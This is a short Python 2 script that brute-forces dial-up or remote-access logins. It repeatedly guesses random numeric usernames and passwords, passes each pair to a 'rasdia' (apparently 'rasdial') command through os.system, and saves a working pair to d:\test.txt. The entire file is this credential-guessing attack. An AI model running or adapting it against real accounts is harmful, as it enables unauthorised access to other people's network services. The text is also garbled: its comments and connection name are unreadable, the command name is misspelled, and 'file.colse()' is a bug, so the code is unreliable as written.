#!/usr/bin/env python

# -*- coding:utf-8 -*-

 

__author__ = 'laiyu'

 

import os

import random

import time

 

if __name__ == "__main__":

    not_found = 1

    while not_found:

        # ������ɿ���ʺź�����

        username = str(random.randint(1000, 9999))

        passwd = str(random.randint(100, 999))

       

        # �������

        cmd_str = "rasdia" + " " + "�������" + " " + username + " " + passwd

        print cmd_str
        not_found = os.system(cmd_str)

        time.sleep(10)

       

        # ���ųɹ��������ʺ�����

        if not_found == 0:

            file = open("d:\\test.txt", "w")

            file.write(username+ "" + passwd)

            file.colse()
